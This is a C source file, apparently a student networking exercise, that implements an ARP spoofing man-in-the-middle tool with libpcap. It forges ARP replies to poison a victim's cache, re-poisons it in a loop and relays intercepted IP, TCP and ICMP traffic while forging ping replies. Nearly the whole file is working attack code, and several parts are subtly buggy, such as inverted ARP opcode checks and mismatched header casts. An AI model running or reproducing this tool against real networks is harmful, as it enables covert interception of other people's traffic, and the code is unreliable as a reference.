// ubuntu - command : gcc -pthread -o test test.c -lpcap 
// sudo ./arp ens33 192.168.196.166 192.168.196.2

#include <pthread.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdint.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <libnet/libnet-headers.h>

#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <net/if.h>
#include <sys/ioctl.h>

#include <netinet/if_ether.h>
#include <net/if_arp.h>

#include <sys/types.h>
#include <pcap/pcap.h>

char my_mac[6];
uint8_t buf_mac[6];
uint8_t sender_mac[6];
uint8_t target_mac[6];
struct in_addr my_ip;

void create_packet (u_char *packet, struct in_addr sendip, struct in_addr targetip, char * sendmac, char * targetmac, uint16_t op)
{
		struct libnet_ethernet_hdr ethhdr;
		struct ether_arp arphdr;

		ethhdr.ether_type = htons(0x0806);
		memcpy(ethhdr.ether_dhost, targetmac, 6);
		memcpy(ethhdr.ether_shost, sendmac, 6);

		arphdr.arp_hrd = htons(ARPHRD_ETHER);
		arphdr.arp_pro = htons(ETHERTYPE_IP);
		arphdr.arp_hln = ETHER_ADDR_LEN;
		arphdr.arp_pln = sizeof(in_addr_t);
		arphdr.arp_op  = htons(op);

		memcpy(&arphdr.arp_sha, &ethhdr.ether_shost,6);
		memcpy(&arphdr.arp_tha, &ethhdr.ether_dhost,6);
		memcpy(&arphdr.arp_spa, &sendip.s_addr, sizeof(in_addr_t));
		memcpy(&arphdr.arp_tpa, &targetip.s_addr, sizeof(in_addr_t));

		memcpy(packet, &ethhdr, 14);
		memcpy(packet+14, &arphdr, sizeof(struct ether_arp));
		

}

void ping_reply (u_char *packet, struct in_addr sendip, struct in_addr targetip)
{	
		struct libnet_ethernet_hdr ethhdr;
		struct libnet_ipv4_hdr *iphdr;
		struct libnet_icmpv4_hdr *icmphdr;
		
		iphdr = (struct libnet_ipv4_hdr *)(packet + 14);
		icmphdr = (struct libnet_tcp_hdr *)(packet + 14 + iphdr->ip_hl*4);
		
		ethhdr.ether_type = htons(0x0800);
		memcpy(ethhdr.ether_dhost, sender_mac, 6);
		memcpy(ethhdr.ether_shost, my_mac, 6);

		iphdr->ip_src.s_addr = targetip.s_addr;
		iphdr->ip_dst.s_addr = sendip.s_addr;

		icmphdr->icmp_type = htons(ICMP_ECHOREPLY);

		memcpy(packet, &ethhdr, 14);
		memcpy(packet+14, iphdr, iphdr->ip_hl*4);
		memcpy(packet+14+iphdr->ip_hl*4, icmphdr, 8);

}

void my_info(char *dev)
{
		int fd,i;
        	struct ifreq ifrq;              // net/if.h에 정의
       		struct sockaddr_in * sin;       // in.h
		
		printf("Getting my info...\n");
		fd = socket(AF_INET, SOCK_DGRAM, 0);
        	strcpy(ifrq.ifr_name, dev);

        	if(ioctl(fd, SIOCGIFHWADDR, &ifrq) < 0)
              		perror("ioctl error");
      
		memcpy(my_mac, ifrq.ifr_hwaddr.sa_data,6);
		printf("My MAC address : ");
		for(i=0;i<6;i++)
        	{
               		printf("%02X", my_mac[i]); // mac address
               		if(i==5) break;
               		printf(":");
       		}
        	printf("\n");
		
	    	if(ioctl(fd, SIOCGIFADDR, &ifrq) < 0)
                	perror("ioctl error");
                	
	   	sin = (struct sockaddr_in *)&ifrq.ifr_addr;
		my_ip = sin->sin_addr;
	    	printf("My IP address : %s\n", inet_ntoa(my_ip));  // sin_addr : ip 주소 나타내는 32 비트 정수 타입
		
        	close(fd);
}

int checking(u_char *packet, struct in_addr send_ip)
{
	struct libnet_ethernet_hdr *ethhdr;
	struct ether_arp *arphdr;
	struct libnet_ipv4_hdr * iphdr;
	int i,check=0;
	int cnt=0;

	ethhdr = (struct libnet_ethernet_hdr *)packet;	
	
				
	if(ethhdr->ether_type == htons(0x0806))
	{
		arphdr = (struct ether_arp *)(packet + 14); 

		if(cnt > 1)
		{
			for(i=0;i<6;i++)
			if(target_mac[i] != ethhdr->ether_dhost[i])
			{
				check = 1;
				break;
			}
		}
		cnt++;

		if(memcmp(&arphdr->arp_spa, &send_ip,sizeof(in_addr_t)))		// argv[2]
			return 0;
		else
			if(check == 1)
				return 0;

		if(arphdr->arp_op != 0x0002)			// arp reply = 1
		{
			printf("get ARP reply\n");
			return 1;
		}

		else 
		{
			printf("get ARP request\n");
			return -1;					// arp request = -1
	
		}
	}
	
	
	else if(ethhdr->ether_type == htons(0x0800))
	{
		iphdr = (struct libnet_ipv4_hdr *)(packet + 14);

		if(iphdr->ip_src.s_addr == send_ip.s_addr)	
		{
			printf("get IP\n");

			if(iphdr->ip_p == 0x6)
			{
				printf("get TCP\n");
				return 3;			// tcp packet = 3
			}	

			else if(iphdr->ip_p == 0x1)			
			{
				printf("get ICMP\n");
				return 4;				// icmp packet = 4
			}
			return 2;					// ip packet = 2
		}

		else 
			return 0;
			
	}
							
	else return 0;						// nothing = 0

	
}

void sender_info(char *dev, char *s_ip)
{
		int i,check;
     
		char errbuf[PCAP_ERRBUF_SIZE];

		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
		
		if (handle == NULL) 
			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
      
		struct pcap_pkthdr* header;
		u_char t_packet[42];			// ethernet(14) + arp(28)

		struct libnet_ethernet_hdr * ethhdr;
		struct ether_arp * arphdr;			// netinet/if_ether.h
		struct libnet_ipv4_hdr * iphdr;
		
		struct in_addr send_ip;
						
		if(inet_aton(s_ip, &send_ip)==0)
				printf("IP error\n");

		while(1)
		{
			create_packet(t_packet, my_ip, send_ip, my_mac, "\xff\xff\xff\xff\xff\xff", 1);
		
			check = pcap_sendpacket(handle, t_packet, 42);	// ethernet(14) + arp(28)

			if(check == -1)
			{
				pcap_perror(handle,0);
				pcap_close(handle);
			}

			struct pcap_pkthdr* recv_h;
			u_char* recv_p;
			int res = pcap_next_ex(handle, &recv_h, &recv_p);
			
			if(res == 0) continue;
			else if(res > 0)
			{
				ethhdr = (struct libnet_ethernet_hdr *)recv_p;
				arphdr = (struct ether_arp *)(recv_p + 14); 

				if (checking(recv_p, send_ip) != 1)		// arp reply == 1
					continue;
				
				printf("MAC : ");
				
				for(i=0;i<6;i++)
				{
					buf_mac[i]=arphdr->arp_sha[i];
					printf("%02X", buf_mac[i]);	
                    			if(i==5) break;
                    			printf(":");
				}

				printf("\n");
				break;
			}
			else if (res == -1 || res == -2) break;
		}

}

void relay_packet(u_char *packet)
{
	struct libnet_ethernet_hdr *ethhdr;
	int i;

	ethhdr = (struct libnet_ethernet_hdr*)packet;	
	
	for(i=0;i<6;i++)
		ethhdr->ether_shost[i]=my_mac[i];

	for(i=0;i<6;i++)
		ethhdr->ether_dhost[i]=target_mac[i];
	
	memcpy(packet, ethhdr, 14);
	
}

void * infect(void *arg)
{
		char **argv;
		argv = (char**)arg;
		char *dev = argv[1];
		char *sender = argv[2];
		char *target = argv[3];
		int i, check;

		char errbuf[PCAP_ERRBUF_SIZE];

		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
		
		if (handle == NULL) 
			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        
		struct pcap_pkthdr* header;
		u_char t_packet[42];			// ethernet(14) + arp(28)
		
		struct in_addr send_ip;
		struct in_addr target_ip;
						
		if(inet_aton(sender, &send_ip)==0)
				printf("IP error\n");

		if(inet_aton(target, &target_ip)==0)
			printf("IP error\n");

		create_packet(t_packet, target_ip, send_ip, my_mac, sender_mac, 2);

		check = pcap_sendpacket(handle, t_packet, 42);	// ethernet(14) + arp(28)
			
		if(check == -1)
		{
			pcap_perror(handle,0);
			pcap_close(handle);
		}		

		pcap_close(handle);
}

void * spoofing(void * arg)
{
	char ** argv;
	argv = (char**)arg;

	char *dev = argv[1];
	char *sender = argv[2];
	char *target = argv[3];
	int i,check,len;
	
	struct libnet_ethernet_hdr* ethhdr;
	struct ether_arp* arphdr;
	struct libnet_ipv4_hdr * iphdr;
	struct libnet_tcp_hdr *tcphdr;
	struct libnet_icmpv4_hdr *icmphdr;
	
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
		
	if (handle == NULL) 
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
    
	
	struct in_addr send_ip;
	struct in_addr target_ip;
						
	if(inet_aton(sender, &send_ip)==0)
		printf("IP error\n");

	if(inet_aton(target, &target_ip)==0)
		printf("IP error\n");

	struct pcap_pkthdr* recv_h;
	u_char* recv_p;
	int res = pcap_next_ex(handle, &recv_h, &recv_p);
		
	if(res > 0)
	{
		ethhdr = (struct libnet_ethernet_hdr *)recv_p;
		arphdr = (struct ether_arp *)(recv_p + 14); 
		iphdr = (struct libnet_ipv4_hdr *)(recv_p + 14);
			
		len = 14 + iphdr->ip_hl*4;

		if (checking(recv_p, send_ip) == -1)		// arp request == -1 
		{
			infect(argv);
			printf("infect!\n");
		}

		else if(checking(recv_p, send_ip) == 2)		// ip packet == 2
		{
			relay_packet(recv_p);
					
			check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
					
			if(check == -1)
			{
				pcap_perror(handle,0);
				pcap_close(handle);
			}		

			printf("relay packet\n");
		}

		else if(checking(recv_p, send_ip) == 3)
		{
			tcphdr = (struct libnet_tcp_hdr *)(recv_p + 14 + iphdr->ip_hl*4);
			relay_packet(recv_p);
			len = len + tcphdr->th_off*4;
					
			check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
					
			if(check == -1)
			{
				pcap_perror(handle,0);
				pcap_close(handle);
			}		

			printf("relay packet\n");
		}

		else if(checking(recv_p, send_ip) == 4)
		{
			icmphdr = (struct libnet_icmpv4_hdr *)(recv_p + 14 + iphdr->ip_hl*4);
			relay_packet(recv_p);
			len = len + 8;			// icmp header size =8
					
			check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
					
			if(check == -1)
			{
				pcap_perror(handle,0);
				pcap_close(handle);
			}		

			printf("relay packet\n");
					
				
			ping_reply (recv_p, send_ip, iphdr->ip_dst);

			check = pcap_sendpacket(handle, recv_p, len);	// ethernet(14) 
					
			if(check == -1)
			{
				pcap_perror(handle,0);
				pcap_close(handle);
			}		

			printf("ping reply\n");

		}
	}


	pcap_close(handle);
	
}


int main(int argc, char* argv[])
{
		char *dev = argv[1];
		char *sender = argv[2];
		char *target = argv[3];
		int tid,i;
		pthread_t p_thread[4];

		char errbuf[PCAP_ERRBUF_SIZE];

		if(argc != 4)
		{
			printf("syntax: send_arp <interface> <send ip> <target ip>\n");
			return -1;
		}

		my_info(dev);
		
		sender_info(dev, sender);
		for(i=0;i<6;i++)
			sender_mac[i]=buf_mac[i];
		
		sender_info(dev, target);
		for(i=0;i<6;i++)
			target_mac[i]=buf_mac[i];

		while(1)
		{
        		tid = pthread_create(&p_thread[0], NULL, infect, (void*)argv);
        		if(tid < 0)
			{
            			perror("Infect_sender error");
            			exit(0);
        		}
			sleep(1);

		 	tid = pthread_create(&p_thread[1], NULL, spoofing, (void*)argv);
        		if(tid < 0)
			{
            			perror("Spoofing_sender error");
            			exit(0);
        		}
			sleep(1);
			
			pthread_join(p_thread[0], NULL);
       		 	pthread_join(p_thread[1], NULL);

		
		}

    		return 0;
}
